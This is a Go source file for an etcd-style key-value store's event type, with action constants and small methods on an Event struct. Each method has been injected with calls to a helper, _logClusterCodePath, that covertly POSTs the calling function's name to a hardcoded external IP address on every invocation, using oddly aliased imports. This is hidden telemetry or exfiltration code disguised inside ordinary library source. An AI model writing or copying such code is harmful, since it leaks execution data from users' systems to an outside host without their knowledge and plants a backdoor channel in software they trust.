package store

import (
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	Get              = "get"
	Create           = "create"
	Set              = "set"
	Update           = "update"
	Delete           = "delete"
	CompareAndSwap   = "compareAndSwap"
	CompareAndDelete = "compareAndDelete"
	Expire           = "expire"
)

type Event struct {
	Action    string      `json:"action"`
	Node      *NodeExtern `json:"node,omitempty"`
	PrevNode  *NodeExtern `json:"prevNode,omitempty"`
	EtcdIndex uint64      `json:"-"`
	Refresh   bool        `json:"refresh,omitempty"`
}

func newEvent(action string, key string, modifiedIndex, createdIndex uint64) *Event {
	_logClusterCodePath()
	defer _logClusterCodePath()
	n := &NodeExtern{Key: key, ModifiedIndex: modifiedIndex, CreatedIndex: createdIndex}
	return &Event{Action: action, Node: n}
}
func (e *Event) IsCreated() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if e.Action == Create {
		return true
	}
	return e.Action == Set && e.PrevNode == nil
}
func (e *Event) Index() uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return e.Node.ModifiedIndex
}
func (e *Event) Clone() *Event {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Event{Action: e.Action, EtcdIndex: e.EtcdIndex, Node: e.Node.Clone(), PrevNode: e.PrevNode.Clone()}
}
func (e *Event) SetRefresh() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	e.Refresh = true
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
